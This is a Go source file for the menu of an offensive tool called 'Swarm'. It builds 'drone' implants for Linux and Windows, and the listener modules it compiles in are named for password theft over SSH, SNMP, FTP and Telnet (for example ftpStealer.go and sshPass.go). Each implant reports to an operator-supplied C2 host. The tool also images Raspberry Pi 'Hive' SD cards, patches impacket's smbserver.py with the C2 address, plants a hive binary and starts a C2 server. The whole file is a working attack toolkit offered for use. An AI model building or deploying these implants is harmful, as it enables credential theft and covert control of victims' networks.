package main

import (
	"./swarmc2"
	"bufio"
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
)

func asciiArt() {
	splashScreen := `
    ███████╗██╗    ██╗ █████╗ ██████╗ ███╗   ███╗
    ██╔════╝██║    ██║██╔══██╗██╔══██╗████╗ ████║
    ███████╗██║ █╗ ██║███████║██████╔╝██╔████╔██║
    ╚════██║██║███╗██║██╔══██║██╔══██╗██║╚██╔╝██║
    ███████║╚███╔███╔╝██║  ██║██║  ██║██║ ╚═╝ ██║
    ╚══════╝ ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝

   _    _ _ _ __ _ ____   _ __ _   _  _ ____ _ ___
   |___  Y  | | \| |__,   | | \|   |/\| |--| |  |




	              \     /
	          \    o ^ o    /
	            \ (     ) /
	 ____________(#######)____________
	(     /   /  )#######(  \   \     )
	(___/___/__/           \__\___\___)
	   (     /  /(=======)\  \     )
	    (__/___/ (=======) \___\__)
	            /(       )\
	          /   (#####)   \
	               ($$$)
	                 !`
	fmt.Println(splashScreen)

}

func clearScreen() {
	cmd := exec.Command("clear")
	cmd.Stdout = os.Stdout
	err := cmd.Run()
	if err != nil {
		log.Println(err)
	}
}

func sshParam() (string, string, error) {
	fmt.Printf("\n Enter C2Server and C2Port <c2server:c2port> : ")
	r := bufio.NewReader(os.Stdin)
	c2Server, err := r.ReadString('\n')
	if err != nil {
		return "", "", err
	}
	line := bytes.Replace([]byte(c2Server), []byte("\n"), []byte(""), 1)
	c2Server = string(line)
	fmt.Printf("\n Please enter the port the Drone will Listen on : ")
	r = bufio.NewReader(os.Stdin)
	listenPort, err := r.ReadString('\n')
	if err != nil {
		return "", "", err
	}
	line = bytes.Replace([]byte(listenPort), []byte("\n"), []byte(""), 1)
	listenPort = string(line)
	return c2Server, listenPort, nil
}

func param() (string, error) {
	fmt.Printf("\n Enter C2Server and C2Port <c2server:c2port> : ")
	r := bufio.NewReader(os.Stdin)
	c2Server, err := r.ReadString('\n')
	if err != nil {
		return "", err
	}
	line := bytes.Replace([]byte(c2Server), []byte("\n"), []byte(""), 1)
	c2Server = string(line)
	return c2Server, nil
}

func hiveParam() (string, error) {
	fmt.Println("Be careful what device you choose!!!!!!")
	fmt.Printf("\n Enter the  filepath for the SD card that needs imaged: ")
	r := bufio.NewReader(os.Stdin)
	devPath, err := r.ReadString('\n')
	if err != nil {
		return "", err
	}
	line := bytes.Replace([]byte(devPath), []byte("\n"), []byte(""), 1)
	devPath = string(line)
	return devPath, err
}

func options() {
	option := `

Choose Your Deployment

1) LinuxDroneSSH64          2) LinuxDroneSSH32         3) WindowsDroneSSH64        4) WindowsDroneSSH32

5) LinuxDroneSNMP64         6) LinuxDroneSNMP32        7) WindowsDroneSNMP64       8) WindowsDroneSNMP32

9) LinuxDroneFTP64         10) LinuxDroneFTP32        11) WindowsDroneFTP64       12) WindowsDroneFTP32

13) LinuxDroneTELNET64     14) LinuxDroneTELNET64     15) WindowsDroneTELNET64    16) WindowsDroneTELNET32

17) ImageHive              18) HiveSMB                19) HiveFTP                 20) HiveSSH

21) HiveSNMP               22) HiveTELNET             23) StartC2Server           24) QUIT

>>> `
	for {
		fmt.Printf(option)
		r := bufio.NewReader(os.Stdin)
		protocol, err := r.ReadString('\n')
		if err != nil {
			fmt.Println(err)
		}
		clearScreen()
		if string(protocol) == "24\n" {
			return
		}
		if string(protocol) == "23\n" {
			go swarmc2.SetupHandler()
		}
		drone(string(protocol))
	}
}

func drone(protocol string) {
	switch protocol {
	case "1\n":
		c2Server, listenPort, err := sshParam()
		if err != nil {
			fmt.Println(err)
			return

		}
		cmd := exec.Command("make", "linuxDroneSSH64", "C2HOST="+c2Server, "LPORT="+listenPort, "LISTENER=goFiles/sshPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()

	case "2\n":
		c2Server, listenPort, err := sshParam()
		if err != nil {
			fmt.Println(err)
			return

		}
		cmd := exec.Command("make", "linuxDroneSSH32", "C2HOST="+c2Server, "LPORT="+listenPort, "LISTENER=goFiles/sshPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "3\n":
		c2Server, listenPort, err := sshParam()
		if err != nil {
			fmt.Println(err)
			return

		}
		cmd := exec.Command("make", "windowsDroneSSH64", "C2HOST="+c2Server, "LPORT="+listenPort, "LISTENER=goFiles/sshPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "4\n":
		c2Server, listenPort, err := sshParam()
		if err != nil {
			fmt.Println(err)
			return

		}
		cmd := exec.Command("make", "windowsDroneSSH32", "C2HOST="+c2Server, "LPORT="+listenPort, "LISTENER=goFiles/sshPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "5\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/snmpPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "6\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/snmpPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "7\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/snmpPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "8\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/snmpPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "9\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/ftpStealer.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "10\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/ftpStealer.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "11\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/ftpStealer.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "12\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/ftpStealer.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "13\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/telnetPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "14\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "linuxDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/telnetPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "15\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone64", "C2HOST="+c2Server, "LISTENER=goFiles/telnetPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "16\n":
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "windowsDrone32", "C2HOST="+c2Server, "LISTENER=goFiles/telnetPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "23\n":
		return
	default:
		hive(protocol)
	}
}

func hive(protocol string) {
	switch protocol {
	case "17\n":
		devPath, err := hiveParam()
		if err != nil {
			fmt.Println(err)
		}
		fmt.Printf("\nPlease choose an image type (SMB|Other): ")
		r := bufio.NewReader(os.Stdin)
		image, err := r.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		switch image {
		case "SMB\n":
			cmd := exec.Command("dd", "if=HIVE/images/hive_smb.iso", "bs=4M", "of="+devPath)
			cmd.Stdout = os.Stdout
			err = cmd.Run()
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Println("You can now unplug and replug in the SD card for Loading...")
			//                clearScreen()

		case "Other\n":
			cmd := exec.Command("dd", "if=HIVE/images/hive.iso", "bs=4M", "of="+devPath)
			cmd.Stdout = os.Stdout
			err = cmd.Run()
			if err != nil {
				fmt.Println(err)
				return
			}
			fmt.Println("You can now unplug and replug in the SD card for Loading...")
			//                clearScreen()
		default:
			fmt.Println("Invalid Selection...")
			return
		}
	case "18\n":
		fmt.Printf("\n Enter mount location </media/<user>/: ")
		r := bufio.NewReader(os.Stdin)
		mountLocation, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line := bytes.Replace([]byte(mountLocation), []byte("\n"), []byte(""), 1)
		mountLocation = string(line)
		data, err := ioutil.ReadFile("HIVE/smbserver.py")
		if err != nil {
			fmt.Println(err)
			return
		}
		fmt.Printf("\n Enter C2Server IP: ")
		r = bufio.NewReader(os.Stdin)
		c2Server, err := r.ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		line = bytes.Replace([]byte(c2Server), []byte("\n"), []byte(""), 1)
		c2Server = string(line)
		byteCode := bytes.Replace(data, []byte("<c2server>"), []byte(c2Server), 1)
		outFile, err := os.Create(mountLocation + "/home/pi/impacket/impacket/smbserver.py")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile.Write(byteCode)
		defer outFile.Close()

	case "19\n":
		fmt.Printf("\n Enter mount location </media/<user>/: ")
		r := bufio.NewReader(os.Stdin)
		mountLocation, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line := bytes.Replace([]byte(mountLocation), []byte("\n"), []byte(""), 1)
		mountLocation = string(line)
		if err != nil {
			fmt.Println(err)
			return
		}
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "hive", "C2HOST="+c2Server, "LISTENER=goFiles/ftpStealer.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		data, err := ioutil.ReadFile("hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile, err := os.Create(mountLocation + "/home/pi/hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile.Write(data)
		defer outFile.Close()
		err = os.Chmod(mountLocation+"/home/pi/hive", 0777)
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "20\n":
		fmt.Printf("\n Enter mount location </media/<user>/: ")
		r := bufio.NewReader(os.Stdin)
		mountLocation, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line := bytes.Replace([]byte(mountLocation), []byte("\n"), []byte(""), 1)
		mountLocation = string(line)
		if err != nil {
			fmt.Println(err)
			return
		}
		c2Server, listenPort, err := sshParam()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "hiveSSH", "C2HOST="+c2Server, "LPORT="+listenPort, "LISTENER=goFiles/sshPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		data, err := ioutil.ReadFile("hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile, err := os.Create(mountLocation + "/home/pi/hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile.Write(data)
		defer outFile.Close()
		err = os.Chmod(mountLocation+"/home/pi/hive", 0777)
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()

	case "21\n":
		fmt.Printf("\n Enter mount location </media/<user>/: ")
		r := bufio.NewReader(os.Stdin)
		mountLocation, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line := bytes.Replace([]byte(mountLocation), []byte("\n"), []byte(""), 1)
		mountLocation = string(line)
		if err != nil {
			fmt.Println(err)
			return
		}
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "hive", "C2HOST="+c2Server, "LISTENER=goFiles/snmpPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		data, err := ioutil.ReadFile("hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile, err := os.Create(mountLocation + "/home/pi/hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile.Write(data)
		defer outFile.Close()
		err = os.Chmod(mountLocation+"/home/pi/hive", 0777)
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	case "22\n":
		fmt.Printf("\n Enter mount location </media/<user>/: ")
		r := bufio.NewReader(os.Stdin)
		mountLocation, err := r.ReadString('\n')
		if err != nil {
			return
		}
		line := bytes.Replace([]byte(mountLocation), []byte("\n"), []byte(""), 1)
		mountLocation = string(line)
		if err != nil {
			fmt.Println(err)
			return
		}
		c2Server, err := param()
		if err != nil {
			fmt.Println(err)
			return
		}
		cmd := exec.Command("make", "hive", "C2HOST="+c2Server, "LISTENER=goFiles/telnetPass.go")
		cmd.Stdout = os.Stdout
		err = cmd.Run()
		if err != nil {
			fmt.Println(err)
			return
		}
		data, err := ioutil.ReadFile("hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile, err := os.Create(mountLocation + "/home/pi/hive")
		if err != nil {
			fmt.Println(err)
			return
		}
		outFile.Write(data)
		defer outFile.Close()
		err = os.Chmod(mountLocation+"/home/pi/hive", 0777)
		if err != nil {
			fmt.Println(err)
			return
		}
		clearScreen()
	default:
		fmt.Println("ERROR! Please Make Input 1-22.... ")
	}
}

func main() {
	asciiArt()
	options()
}
